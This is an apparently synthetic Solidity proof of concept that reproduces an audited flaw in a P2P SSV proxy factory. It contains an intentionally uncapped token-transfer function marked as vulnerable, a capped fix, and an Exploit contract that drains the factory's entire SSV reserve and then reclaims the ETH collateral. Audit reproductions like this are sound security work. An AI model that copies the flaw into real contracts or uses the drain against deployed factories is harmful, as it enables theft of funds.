// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  P2P P2pSsvProxyFactory.depositEthAndRegisterValidators — tokenAmount
    is not capped (MixBytes, AuditVault 29417).
    SYNTHETIC, cheatcode-free. The audited line transfers
    `_ssvPayload.tokenAmount` of the factory's SSV to the new proxy.
    registerValidators checks the ETH paid for that amount. This function
    does not. A caller who is not an operator owner deposits 32 ETH with
    their own withdrawal credentials and tokenAmount equal to the whole
    reserve. The proxy holds 1000000 SSV. The factory holds 0. The caller
    then claims the 32 ETH back. A 1000 SSV cap leaves 999000 in the factory. */

contract SsvToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract DepositContract {
    uint256 public constant COLLATERAL = 32 ether;
    mapping(address => uint256) public locked;

    function deposit(bytes calldata, bytes calldata withdrawalCredentials, bytes calldata, bytes32) external payable {
        require(msg.value == COLLATERAL, "32 eth");
        address who = address(bytes20(withdrawalCredentials[12:32]));
        locked[who] += msg.value;
    }

    function claim(address who) external {
        uint256 amount = locked[who];
        locked[who] = 0;
        payable(who).transfer(amount);
    }
}

contract P2pSsvProxy {
    address public client;

    constructor(address client_) {
        client = client_;
    }
}

contract P2pSsvProxyFactory {
    uint256 public constant COLLATERAL = 32 ether;
    uint256 public constant MAX_SSV = 1000;

    struct SsvOperator {
        address owner;
        uint64 id;
    }

    struct SsvPayload {
        SsvOperator[] ssvOperators;
        uint256 tokenAmount;
    }

    SsvToken public i_ssvToken;
    DepositContract public i_depositContract;
    address public allowedOwner;
    uint64 public allowedId;

    error P2pSsvProxyFactory__EthValueMustBe32TimesValidatorCount(uint256 value);
    error P2pSsvProxyFactory__SsvOperatorNotAllowed(address owner, uint64 id);
    error P2pSsvProxyFactory__TokenAmountTooHigh(uint256 amount, uint256 max);

    modifier onlyAllowedOperators(SsvOperator[] calldata _operators) {
        uint256 operatorCount = _operators.length;
        for (uint256 i = 0; i < operatorCount;) {
            address currentOperatorOwner = _operators[i].owner;
            bool isAllowed = currentOperatorOwner == allowedOwner && _operators[i].id == allowedId;
            if (!isAllowed) {
                revert P2pSsvProxyFactory__SsvOperatorNotAllowed(currentOperatorOwner, _operators[i].id);
            }
            unchecked {
                ++i;
            }
        }
        _;
    }

    constructor(SsvToken token_, DepositContract deposit_, address allowedOwner_, uint64 allowedId_) {
        i_ssvToken = token_;
        i_depositContract = deposit_;
        allowedOwner = allowedOwner_;
        allowedId = allowedId_;
    }

    function depositEthAndRegisterValidators(address withdrawalCredentialsAddress, SsvPayload calldata _ssvPayload)
        external
        payable
        returns (address p2pSsvProxy)
    {
        _makeBeaconDeposits(withdrawalCredentialsAddress);
        p2pSsvProxy = _registerValidators(_ssvPayload);
    }

    function depositCapped(address withdrawalCredentialsAddress, SsvPayload calldata _ssvPayload)
        external
        payable
        returns (address p2pSsvProxy)
    {
        if (_ssvPayload.tokenAmount > MAX_SSV) {
            revert P2pSsvProxyFactory__TokenAmountTooHigh(_ssvPayload.tokenAmount, MAX_SSV);
        }
        _makeBeaconDeposits(withdrawalCredentialsAddress);
        p2pSsvProxy = _registerValidators(_ssvPayload);
    }

    function _makeBeaconDeposits(address _withdrawalCredentialsAddress) private {
        if (msg.value != COLLATERAL) {
            revert P2pSsvProxyFactory__EthValueMustBe32TimesValidatorCount(msg.value);
        }
        bytes memory withdrawalCredentials =
            abi.encodePacked(hex"010000000000000000000000", _withdrawalCredentialsAddress);
        i_depositContract.deposit{value: COLLATERAL}("", withdrawalCredentials, "", bytes32(0));
    }

    function _registerValidators(SsvPayload calldata _ssvPayload)
        private
        onlyAllowedOperators(_ssvPayload.ssvOperators)
        returns (address p2pSsvProxy)
    {
        p2pSsvProxy = address(new P2pSsvProxy(msg.sender));
        // @> VULN: tokenAmount is chosen by the caller and is not capped.
        i_ssvToken.transfer(p2pSsvProxy, _ssvPayload.tokenAmount);
    }
}

contract Exploit {
    uint256 public constant RESERVE = 1_000_000;
    uint256 public constant COLLATERAL = 32 ether;

    SsvToken public ssv;
    DepositContract public beacon;
    P2pSsvProxyFactory public factory;
    P2pSsvProxy public proxy;
    uint256 public drained;
    uint256 public factoryLeft;
    uint256 public ethReturned;

    constructor() {
        ssv = new SsvToken();
        beacon = new DepositContract();
        factory = new P2pSsvProxyFactory(ssv, beacon, address(0x0B0), 1);
        ssv.mint(address(factory), RESERVE);
    }

    receive() external payable {}

    function run() external payable {
        require(msg.value == COLLATERAL, "32 eth");
        require(ssv.balanceOf(address(factory)) == RESERVE, "reserve");
        P2pSsvProxyFactory.SsvOperator[] memory ops = new P2pSsvProxyFactory.SsvOperator[](1);
        ops[0] = P2pSsvProxyFactory.SsvOperator({owner: address(0x0B0), id: 1});
        P2pSsvProxyFactory.SsvPayload memory payload =
            P2pSsvProxyFactory.SsvPayload({ssvOperators: ops, tokenAmount: RESERVE});
        address created = factory.depositEthAndRegisterValidators{value: COLLATERAL}(address(this), payload);
        proxy = P2pSsvProxy(created);
        drained = ssv.balanceOf(created);
        factoryLeft = ssv.balanceOf(address(factory));
        require(proxy.client() == address(this), "caller owns the proxy");
        require(drained == RESERVE, "proxy holds the reserve");
        require(factoryLeft == 0, "factory empty");
        beacon.claim(address(this));
        ethReturned = address(this).balance;
        require(ethReturned == COLLATERAL, "32 eth back");
        require(beacon.locked(address(this)) == 0, "deposit claimed");
    }
}
